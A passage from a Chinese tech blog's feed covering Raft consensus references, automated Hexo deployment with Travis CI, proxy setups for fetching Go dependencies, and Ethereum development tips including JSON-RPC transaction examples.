在心跳超时后仍旧没有收到 leader 节点的心跳消息，那么 followers 节点就会发起新一轮投票，直到选举出新的 leader 来。</p><p><strong>网络分区的情况下会发生什么？</strong></p><p>网络故障导致导致节点被分隔到多个不连通的区域，在被隔离的区域中又会触发新的 leader 选举，对于隔离区域中包含半数以上的节点，选举就可能成功。当网络恢复后，followers 接受最大任期（term）和最新日志的 leader。这个思路蕾丝比特币、以太坊网络分叉后以最长区块为准的解决方案，确保了最终一致性。</p><h2 id="0x04-Raft-参考资料"><a href="#0x04-Raft-参考资料" class="headerlink" title="0x04 Raft 参考资料"></a>0x04 Raft 参考资料</h2><ul><li>这里是一个不错的 Raft 算法演示网站，非常推荐用它演练一遍，增加对 Raft 的理解 <a href="http://thesecretlivesofdata.com/raft" target="_blank" rel="noopener">http://thesecretlivesofdata.com/raft</a></li><li>Raft 算法的 Github 主页，里边也包含了一个可视化演示 <a href="https://raft.github.io" target="_blank" rel="noopener">https://raft.github.io</a></li><li>Raft 论文 <a href="https://raft.github.io/raft.pdf" target="_blank" rel="noopener">https://raft.github.io/raft.pdf</a></li><li>Raft 各种语言的实现 <a href="https://raft.github.io/#implementations" target="_blank" rel="noopener">https://raft.github.io/#implementations</a></li><li>这里是对 Raft 算法对详解 <a href="https://zhuanlan.zhihu.com/p/32052223" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/32052223</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h2&gt;&lt;p&gt;最近两年工作中对区块链技术接触较多，接下来可能要告一段落了。期间对 go-ethereum 进行过联
      
    
    </summary>
    
    
      <category term="raft" scheme="https://g2ex.top/tags/raft/"/>
    
  </entry>
  
  <entry>
    <title>使用 Travis 自动化部署 Hexo Blog</title>
    <link href="https://g2ex.top/2019/06/28/hexo-with-travis-ci/"/>
    <id>https://g2ex.top/2019/06/28/hexo-with-travis-ci/</id>
    <published>2019-06-28T22:30:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>使用 Hexo + Github Pages 搭建博客后，每次更新文章需要使用 <code>hexo d -g</code> 会在本地生成 <code>public</code> 静态博客网站和向 Github 推送的 <code>.deploy_git</code> 文件夹。<code>.deploy_git</code> 文件夹内容和 <code>public</code> 文件夹一致，但多了 Github 博客项目的仓库信息与提交信息。最终，<code>.deploy_git</code> 文件夹内的全部内容被推送到 Github 仓库中，由 Github Pages 服务完成静态网站的解析。</p><p>当切换工作环境后，需要重新安装 Nodejs 以及配置 Hexo 和它的依赖。而且每次更新文章后，都要 <code>hexo d -g</code> 手动部署。这样多次重复的工作非常低效，因此结合现在非常流行的 CI/CD 概念和工具，可以为 Hexo + Github Pages 博客集成 Travis CI 自动部署的能力。当推送博客仓库到 Github 后，由 Travis 自动获取当前 commit 并进行构建，把生成的静态网站推送到 Github Pages 分支。</p><h2 id="0x01-理解-Hexo-的自动化部署"><a href="#0x01-理解-Hexo-的自动化部署" class="headerlink" title="0x01 理解 Hexo 的自动化部署"></a>0x01 理解 Hexo 的自动化部署</h2><p>下图是 Hexo 手动部署的流程，hexo-blog 可以是本地一个项目，也可以是 Github、Gitlab 等仓库，本地配置好 Hexo 环境后，由 ① 触发部署，将本地生成的静态博客网站 <code>.delpoy_git</code> 推送到 Github 的静态博客仓库中。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2019-06-29_114954.webp" alt="hexo-without-travis" title="图1. Hexo 手动部署流程"></p><p>当引入 Travis 后，整个流程变成了下图所示的流程。hexo-blog 项目必须是一个 Github 仓库了，当有文章更新，本地由 ① 触发，把 Hexo-blog 的源码推送到 Github，剩下的工作由 Travis 完成：获取 Github hexo-blog 仓库中最新的 commit，运行我们定义的 <code>.travis.yml</code> 并把生成的静态博客网站 <code>.deploy_git</code> 推送 Github 静态博客仓库 xxx.github.io。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2019-06-29_115056.webp" alt="hexo-with-travis" title="图2. 使用 Travis 后的 Hexo 部署流程"></p><blockquote><p>注意，这里要区分 Github 中的两个仓库：静态 blog repo 和 Hexo blog repo。前者是博客网站的静态网站项目，由 Github Pages 托管和解析；后者是 Hexo 项目，前者的内容是由后者生成的。</p></blockquote><h2 id="0x02-如何配置自动化部署"><a href="#0x02-如何配置自动化部署" class="headerlink" title="0x02 如何配置自动化部署"></a>0x02 如何配置自动化部署</h2><p>再看一次引入 Travis 后的流程图，绿色箭头的流程是 Travis 自动运行的。要想实现自动化部署，需要 Travis：</p><ol><li>能够自动获取 hexo-blog 仓库的代码提交；</li><li>能够从 hexo-blog 仓库的源码中生成静态博客网站 .deploy_git 目录；</li><li>能够把静态博客网站目录文件推送到静态博客仓库 xxx.github.io 中；</li></ol><p>接下来，我们用三个步骤，分别解决上面提到的三个问题。</p><h3 id="1-配置-Travis-获取-Hexo-blog"><a href="#1-配置-Travis-获取-Hexo-blog" class="headerlink" title="1. 配置 Travis 获取 Hexo blog"></a>1. 配置 Travis 获取 Hexo blog</h3><p>在 <a href="https://travis-ci.org/account/repositories" target="_blank" rel="noopener">https://travis-ci.org/account/repositories</a> 中勾选你的 hexo-blog 项目仓库，注意，这里不是静态博客项目而是 Hexo blog 的源码仓库。</p><p>这样，每当 hexo-blog 有新的 commit 时，Travis 都能收到 Gitub 的回调，并从 hexo-blog 仓库中拉取最新提交的代码。</p><h3 id="2-配置-Travis-自动编译"><a href="#2-配置-Travis-自动编译" class="headerlink" title="2. 配置 Travis 自动编译"></a>2. 配置 Travis 自动编译</h3><p>Travis 的自动编译是由项目根目录的 <code>.travis.yml</code> 来控制的。我们需要为 hexo-blog 项目编写一个 <code>.travis.yml</code> 文件，下面是一个 <code>.travis.yml</code> 示例。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">node_js</span></span><br><span class="line"><span class="attr">node_js:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">'10'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="attr">before_install:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.name</span> <span class="string">"YOUR NAME"</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.email</span> <span class="string">"YOUR EMAIL"</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">sed</span> <span class="string">-i''</span> <span class="string">"s~https://github.com/&lt;YOUR NAME&gt;/&lt;YOUR BLOG REPO&gt;.git~https://$&#123;ACCESS_TOKEN&#125;@github.com/&lt;YOUR NAME&gt;/&lt;YOUR REPO&gt;.git~"</span> <span class="string">_config.yml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-cli</span> <span class="string">-g</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span></span><br><span class="line"></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">npm</span> <span class="string">run</span> <span class="string">deploy</span></span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><p><code>language</code> 和 <code>node_js</code> 指定了使用 NodeJS docker 进行构建，NodeJS 版本为 10.x；</p></li><li><p><code>branches</code> 指定只有 master 分支的提交才进行构建；</p></li><li><p><code>before_install</code> 用于配置推送静态博客网站项目的 git 信息，最重要的是 <code>sed -i</code> 这条命令，该命令把 hexo-blog 配置文件 <code>_config.yml</code> 中的 git remote URL 替换为携带认证 <code>ACCESS TOKEN</code> 的 URL。  这样避免了 Travis 中需要输入用户名密码的问题。关于 <code>${ACCESS_TOKEN}</code> 变量会在接下来进行说明；</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _config.yml</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/&lt;YOUR</span> <span class="string">NAME&gt;/&lt;YOUR</span> <span class="string">REPO&gt;.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></li><li><p><code>install</code> 指定了每次构建之前需要先安装 hexo 和 hexo-blog 项目中的依赖；</p></li><li><p><code>script</code> 指定了运行的 npm deploy 命令去执行 <code>hexo d -g</code>。deploy 命令配置在了 hexo-blog 项目的 package.json 中：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  "scripts": &#123;</span><br><span class="line">    "deploy": "hexo clean &amp;&amp; hexo d -g"</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-配置-Travis-推送博客仓库的权限"><a href="#3-配置-Travis-推送博客仓库的权限" class="headerlink" title="3. 配置 Travis 推送博客仓库的权限"></a>3. 配置 Travis 推送博客仓库的权限</h3><p>Travis 需要把生成的静态博客网站推送到 Github 博客网站仓库，需要有仓库的读写权限，有两个办法为 Travis 配置权限：</p><ul><li>一个是把 Github SSH Key 放到 Hexo-blog 项目中，Travis 构建完成推送时，使用 SSH Key 推送；</li><li>另一种办法是在 Github 中为 Travis 生成一个拥有读写仓库权限的 Personal access tokens。上面的 .travis.yml 中使用到的 <code>${ACCESS_TOKEN}</code> 变量便是第二种方法。</li></ul><p>关于第一种使用 Github SSH Key 的方法，因为 Hexo-blog 是公开项目，所以直接把 SSH Key 放到项目里是不安全的，因此需要使用 Travis 先把 SSH Key 加密，并在 .travis.yml 中配置解密。该方法配置稍微复杂一点，这里介绍更简单的 Personal access tokens 方法。</p><ol><li><p>登录静态网站项目的 Github 账号，在 <a href="https://github.com/settings/tokens" target="_blank" rel="noopener">https://github.com/settings/tokens</a> 中生成新的 token，并勾选 repo 权限。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2019-06-29_133541.webp" alt="github-access-token" title="图3. 生成 Personal access token"></p><p>生成的 token 一定要复制保存下来。</p></li><li><p>在 <a href="https://travis-ci.org/account/repositories" target="_blank" rel="noopener">https://travis-ci.org/account/repositories</a> 中点击 hexo-blog 项目的 settings，添加环境变量，把上面生成的 token 设置为变量，这里的变量名字设置为 <code>ACCESS_TOKEN</code> ，和 .travis.yml 中的配置一致。注意，为了安全不要勾选 <code>DISPLAY VALUE IN BUILD LOG</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2019-06-29_134507.webp" alt="travis-env-var" title="图4. Travis 添加环境变量"></p></li></ol><p>至此，自动化部署已经配置好了。</p><p>在 Hexo blog 项目中新建一个 git commit，可以在 Travis 中查看项目构建的过程了，不管成功还是失败，你的邮箱都会收到一封构建邮件。</p><h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>不论是本文的 Travis 配置，还是其他新鲜的知识，只有理解了技术的原理，才能在遇到问题的时候知道怎么解决，看到别人的解决方法时知道他的思路和为什么要这么做，是否还有更优的方法。</p><p>最近一年基本没有新的文章，倒是时不时更新一下之前的文章。有些东西已经过时了，但依然保留在了这个博客中。这里，不仅仅是记录和分享，也见证了自己点滴的成长。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;使用 Hexo + Github Pages 搭建博客后，每次更新文章需要使用 &lt;code&gt;hexo
      
    
    </summary>
    
    
      <category term="hexo" scheme="https://g2ex.top/tags/hexo/"/>
    
      <category term="travis" scheme="https://g2ex.top/tags/travis/"/>
    
      <category term="CI" scheme="https://g2ex.top/tags/CI/"/>
    
  </entry>
  
  <entry>
    <title>Golang 项目被墙包的获取</title>
    <link href="https://g2ex.top/2018/05/25/go-dep-tips/"/>
    <id>https://g2ex.top/2018/05/25/go-dep-tips/</id>
    <published>2018-05-25T18:18:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Updated at 2019-02-23</p></blockquote><p>因为 golang.org 被墙，go 项目打包 vendor 的时候，golang.org/x 的包是无法下载的。现在 <code>go mod</code> 成了官方主推的 vendor 管理工具，使用 go mod，可以在 <code>go.mod</code> 中使用 <code>replace</code> 替换成 github 上对应的库。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">replace (</span><br><span class="line">golang.org/x/net v0.0.0-20180821023952-922f4815f713 =&gt; github.com/golang/net v0.0.0-20180826012351-8a410e7b638d</span><br><span class="line">...</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>我们一些老项目还是用的 <code>dep</code> 工具。不管是 go mod 还是 dep 管理 vendor 依赖包，都可以用 VPN 或代理的方式去使用。</p><h2 id="Windows-Mac-平台"><a href="#Windows-Mac-平台" class="headerlink" title="Windows / Mac 平台"></a>Windows / Mac 平台</h2><p>Windows / Mac 下使用 <strong>Proxifier</strong> 全局强制代理。</p><h2 id="Linux-平台"><a href="#Linux-平台" class="headerlink" title="Linux 平台"></a>Linux 平台</h2><h3 id="全局代理的方式"><a href="#全局代理的方式" class="headerlink" title="全局代理的方式"></a>全局代理的方式</h3><p>Linux 下可以通过设置 HTTP 代理，让 go mod、dep 命令（实际上是让 go、git 走代理）通过代理下载依赖的包。如果没有 HTTP 代理，只有 Shadowsocks 代理的话，可以安装 privoxy，把 SOCKS5 协议转换为 HTTP 协议，默认 privoxy 监听的是 8118 http 端口，以下脚本中的端口号根据自己的 HTTP 代理端口自行更改。（<code>shadowsocks-qt5</code> 版本的 SS 是直接支持 HTTP 代理的。）</p><p>下面的别名方法可以在终端中设置一键代理和取消代理：</p><p>在 <code>~/.bashrc</code> 或 <code>~/.bash_profile</code> 或 <code>~/.zshrc</code> （如果使用 zsh）中添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">alias proxy=&quot;</span><br><span class="line">    export http_proxy=http://127.0.0.1:8118/;</span><br><span class="line">    export https_proxy=http://127.0.0.1:8118/;</span><br><span class="line">    export all_proxy=http://127.0.0.1:8118/;</span><br><span class="line">    export no_proxy=localhost,127.0.0.0/8,::1;</span><br><span class="line">    export HTTP_PROXY=http://127.0.0.1:8118/;</span><br><span class="line">    export HTTPS_PROXY=http://127.0.0.1:8118/;</span><br><span class="line">    export ALL_PROXY=http://10.0.0.117:8118/;</span><br><span class="line">    export NO_PROXY=localhost,127.0.0.0/8,::1&quot;</span><br><span class="line">alias unproxy=&quot;</span><br><span class="line">    unset http_proxy;</span><br><span class="line">    unset https_proxy;</span><br><span class="line">    unset all_proxy;</span><br><span class="line">    unset no_proxy;</span><br><span class="line">    unset HTTP_PROXY;</span><br><span class="line">    unset HTTPS_PROXY;</span><br><span class="line">    unset ALL_PROXY;</span><br><span class="line">    unset NO_PROXY&quot;</span><br></pre></td></tr></table></figure><p>添加完成后 <code>source ~/.bashrc</code> 或 <code>source ~/.bash_profile</code> 或 <code>source ~/.zshrc</code> 或 重启终端。需要用 go mod、dep 前执行 <code>proxy</code>，不需要代理了执行 <code>unproxy</code> 或直接退出当前终端。</p><h3 id="只准对当前程序代理"><a href="#只准对当前程序代理" class="headerlink" title="只准对当前程序代理"></a>只准对当前程序代理</h3><p>使用 <code>proxychains-ng</code> 工具 <a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="noopener">https://github.com/rofl0r/proxychains-ng</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 -q go mod vendor</span><br></pre></td></tr></table></figure><h3 id="类似-VPN-全局的方式"><a href="#类似-VPN-全局的方式" class="headerlink" title="类似 VPN 全局的方式"></a>类似 VPN 全局的方式</h3><p>使用 <code>sshuttle</code> 工具 <a href="https://github.com/sshuttle/sshuttle" target="_blank" rel="noopener">https://github.com/sshuttle/sshuttle</a></p><p>这也是我自己当前最常用的方式。sshuttle 通过设置本机<br>iptables 来实现本地请求转发到目标 ssh 主机，远程服务器不需要安装任何软件，只要你能 ssh 登录到远程服务器即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 转发所有流量到远程主机</span></span><br><span class="line">$ sshuttle -r username@ssh-server 0.0.0.0/0 -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0.0.0.0/0 可以缩写成 0/0</span></span><br><span class="line">$ sshuttle -r username@ssh-server 0/0 -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只转发 192.168.*.* 网段的请求到远程主机</span></span><br><span class="line">$ sshuttle -r username@ssh-server 192.168.0.0/16 -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># -v 表示显示详情 </span></span><br><span class="line"><span class="comment"># -vv 表示更多的信息</span></span><br></pre></td></tr></table></figure><hr><p>实在嫌麻烦，就在国外的 VPS 上打包 vendor，然后把项目同步过来 - -!</p><blockquote><p>本文更是对代理的一种讨论。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Updated at 2019-02-23&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因为 golang.org 被墙，go 项目打包 vendor 的时候，golang.org/x 的包是无法下载的。现在 &lt;code&gt;go mod&lt;/code&gt; 
      
    
    </summary>
    
    
      <category term="vendor" scheme="https://g2ex.top/tags/vendor/"/>
    
      <category term="golang" scheme="https://g2ex.top/tags/golang/"/>
    
      <category term="shadowsocks" scheme="https://g2ex.top/tags/shadowsocks/"/>
    
      <category term="proxy" scheme="https://g2ex.top/tags/proxy/"/>
    
  </entry>
  
  <entry>
    <title>以太坊开发填坑指北</title>
    <link href="https://g2ex.top/2018/03/11/ethereum-guide/"/>
    <id>https://g2ex.top/2018/03/11/ethereum-guide/</id>
    <published>2018-03-11T12:50:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>甩锅提醒：本文更新于 <code>2018.3.31</code>，未来这些内容肯定会过时，务必善用搜索引擎去获取知识和技能。本文内容杂多，可能需要对区块链有一些深入了解的同学才能看懂。</p><h2 id="0x00-一些-Tips"><a href="#0x00-一些-Tips" class="headerlink" title="0x00 一些 Tips"></a>0x00 一些 Tips</h2><ol><li><p>关于私有链搭建。直接用 puppeth。生成创世块 json 配置文件后，可以手动修改其中的参数。如果使用 PoW 共识，账本数据目录下 keystore/ 目录不需要放置挖矿账户的 keystore 文件。如果选择 PoA 共识，则要把记账账户的 keystore 放到这个目录下，因为 PoA 记账需要解锁这个账户。</p></li><li><p>以太坊区块最多可以容纳多少笔交易？<br>比特币把块大小限制到了 1M 或 nM。和比特币不同，在以太坊里，块中容纳的交易数由共识节点的 gasLimit 设置。当前公网的 gasLimit 可以从 <a href="https://ethstats.net" target="_blank" rel="noopener">https://ethstats.net</a> 查询到，大约 8000000 左右。理论上，gasLimit 可以设置无限大，这样一个块中可以打包无限笔交易。问题讨论请参考 <a href="https://forum.ethereum.org/discussion/1757/maximum-block-size" target="_blank" rel="noopener">https://forum.ethereum.org/discussion/1757/maximum-block-size</a><br>但是，在创世块配置信息里改 gasLimit 是无效的！需要在启动 geth 的时候用 <code>--targetgaslimit</code> 设置。</p></li><li><p>Ethereum Wallet 和 Mist 有什么区别？<br><a href="https://github.com/ethereum/mist/releases" target="_blank" rel="noopener">https://github.com/ethereum/mist/releases</a> 这里提供了这两个软件的下载，有人会把这两者都称为钱包。区别是 Mist 是一个去中心化应用浏览器。可以用 Mist 浏览器打开任何 Ethereum Dapp 应用。  Ethereum Wallet 是 Mist 浏览器 + 以太坊钱包 Wallet Dapp 应用。<br>参考：<a href="https://ethereum.stackexchange.com/questions/2690/what-is-the-relationship-between-mist-and-ethereum-wallet" target="_blank" rel="noopener">https://ethereum.stackexchange.com/questions/2690/what-is-the-relationship-between-mist-and-ethereum-wallet</a></p></li><li><p>Mist 如何连接私有链？</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 把 127.0.0.1:8545 替换成你的私有链地址</span><br><span class="line">mist --rpc http://127.0.0.1:8545 --swarmurl="http://swarm-gateways.net"</span><br><span class="line">// 不启动 rpc 的话，也可以如下直接通过 ipc 通信</span><br><span class="line">mist --rpc /path/to/geth.ipc --node-networkid your_network_id --node-datadir /path/to/ethereum/dir/</span><br></pre></td></tr></table></figure></li><li><p>Ubuntu 16.04 x64 启动 mist 时缺少 libXss.so.1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 错误描述</span><br><span class="line">mist: error while loading shared libraries: libXss.so.1: cannot open shared object file: No such file or directory</span><br><span class="line"></span><br><span class="line">// 在 64 位系统中，需要安装 32 位的依赖库</span><br><span class="line">apt install libxss1:i386</span><br><span class="line">apt install libgconf2-4:i386</span><br><span class="line">apt install libasound2:i386</span><br></pre></td></tr></table></figure></li><li><p>启动 mist 提示不能启动 swarm<br>错误描述：[ERROR] main - Error starting up node and/or syncing Error: Couldn’t start swarm process.<br>终端/命令行启动时加上 <code>--swarmurl=&quot;http://swarm-gateways.net&quot;</code> 参数。如果在 Windows 中使用，右键 Mist 快捷方式属性，在 <code>快捷方式</code> 选项卡，<code>目标</code> 里加上上述参数。</p></li><li><p>MyEtherWallet 的坑。MyEtherWallet 是一个离线钱包，开源，你可以下载这个项目本地打开 index.html 文件离线运行。生成的 keystore 与标准 keystore 存在一个字母大小写的差别，它把 keystore 文件中的 <code>Crypto</code> 的首字母大写了，以至 imToken 等钱包无法导入。<br>修改源码 js\etherwallet-master.js 文件，把 <code>Crypto:</code> 改为 <code>crypto:</code> 即可。</p></li><li><p>以太坊账户的疑问。不少人会问到这个问题：账户钱包地址都是离线创建，以太坊网络怎么知道你的地址和余额？以太坊是基于账户的设计，和比特币的 UTXO 不一样。比特币网络不保存某个账户的余额，这是由钱包或者其他中心和的服务通过账本进行了遍历和索引。以太坊网络中则保存了账户地址对应的余额。那么这个账户地址的余额是什么时候出现到了链上呢？答案是 <strong>当有交易从发送者的账户转移价值到接收者账户时，如果接收账户还不存在，则在区块链中创建此账户。</strong> 这时，你离线创建的账号地址才真正出现在链上。</p></li></ol><h2 id="0x01-以太坊钱包开发"><a href="#0x01-以太坊钱包开发" class="headerlink" title="0x01 以太坊钱包开发"></a>0x01 以太坊钱包开发</h2><p>通过 geth 客户端创建账户时，不会有助记词，是直接通过密码生成了 keystone 文件。以太坊中的助记词是从比特币钱包拿过来用的。助记词、种子、私钥的关系，可以参考《精通比特币》 <a href="http://zhibimo.com/read/wang-miao/mastering-bitcoin/Chapter04.html" target="_blank" rel="noopener">http://zhibimo.com/read/wang-miao/mastering-bitcoin/Chapter04.html</a> 中的 <strong>确定性（种子）钱包</strong> 章节。</p><ol><li>Android 钱包开发，可以参考 <a href="https://github.com/p-acs/ethereum-offline-signer" target="_blank" rel="noopener">https://github.com/p-acs/ethereum-offline-signer</a></li><li>iOS 钱包开发，可以参考 <a href="https://github.com/ethers-io/ethers.objc" target="_blank" rel="noopener">https://github.com/ethers-io/ethers.objc</a></li><li>Web 钱包开发，参照 MyEtherWallet <a href="https://github.com/kvhnuke/etherwallet" target="_blank" rel="noopener">https://github.com/kvhnuke/etherwallet</a></li></ol><p>移动端 Android 和 iOS 开发，还可以选择 React Native，使用 web3js，毕竟 web3js 已经把 JSON-RPC 接口封装好了。</p><h2 id="0x02-以太坊接口开发"><a href="#0x02-以太坊接口开发" class="headerlink" title="0x02 以太坊接口开发"></a>0x02 以太坊接口开发</h2><p>Geth、Parity 对外都提供了标准的 HTTP JSON-RPC 接口。更方便的是，Node 有 web3js 库可以用，Java 和 Android 有 web3j 库可以用。</p><h3 id="HTTP-JSON-RPC-的说明"><a href="#HTTP-JSON-RPC-的说明" class="headerlink" title="HTTP JSON-RPC 的说明"></a>HTTP JSON-RPC 的说明</h3><p>JONS-RPC 中提供了 <code>eth_sendTransaction</code> 、 <code>eth_sendRawTransaction</code> 、 <code>personal_sendTransaction</code>。这三个都是向节点发起交易，可以用来转账、调用合约。那么，它们的的区别是？</p><p><strong>eth_sendTransaction</strong><br>发送未签名的交易，但是在发送这笔交易之前，需要调用 <code>personal_unlockAccount</code> 解锁交易发起方的账户。开放 <code>personal_unlockAccount</code> 容易引起安全问题，例如这样的攻击手段 <a href="https://mp.weixin.qq.com/s/Kk2lsoQ1679Gda56Ec-zJg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Kk2lsoQ1679Gda56Ec-zJg</a></p><p>这种交易构造起来是这样的：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"jsonrpc"</span>: <span class="string">"2.0"</span>,</span><br><span class="line">  <span class="attr">"method"</span>: <span class="string">"eth_sendTransaction"</span>,</span><br><span class="line">  params: [&#123;</span><br><span class="line">  "from": "0xb60e8dd61c5d32be8058bb8eb970870f07233155",</span><br><span class="line">  "to": "0xd46e8dd67c5d32be8058bb8eb970870f07244567",</span><br><span class="line">  "gas": "0x76c0", // 30400</span><br><span class="line">  "gasPrice": "0x9184e72a000", // 10000000000000</span><br><span class="line">  "value": "0x9184e72a", // 2441406250</span><br><span class="line">  "data": "0xd46e8dd67c5d32be8d46e8dd67c5d32be8058bb8eb970870f072445675058bb8eb970870f072445675"</span><br><span class="line">&#125;],</span><br><span class="line">  "id": "dee5ca0b-8be5-4705-94a0-cab3659df089"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>eth_sendRawTransaction</strong><br>发送签名后的交易，没有安全风险。但是需要自己把合约方法名、所有参数按照以太坊规定编码成 ABI 十六进制形式。编码方式参照 <a href="https://github.com/ethereum/wiki/wiki/Ethereum-Contract-ABI" target="_blank" rel="noopener">https://github.com/ethereum/wiki/wiki/Ethereum-Contract-ABI</a><br>好消息是，以太坊提供这样的库来编码函数名和参数编码。go 使用 go-ethereum 的 github.com/ethereum/go-ethereum/accounts/abi 中提供的 Pack() 方法，JS 使用 <a href="https://github.com/ethereumjs/ethereumjs-abi" target="_blank" rel="noopener">https://github.com/ethereumjs/ethereumjs-abi</a> 提供的 rawEncode() 方法。</p><p>这种交易构造起来是这样的：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"jsonrpc"</span>: <span class="string">"2.0"</span>,</span><br><span class="line">  <span class="attr">"method"</span>: <span class="string">"eth_sendTransaction"</span>,</span><br><span class="line">  params: ["0xd46e8dd67c5d32be8d46e8dd67c5d32be8058bb8eb970870f072445675058bb8eb970870f072445675"],</span><br><span class="line">  "id": 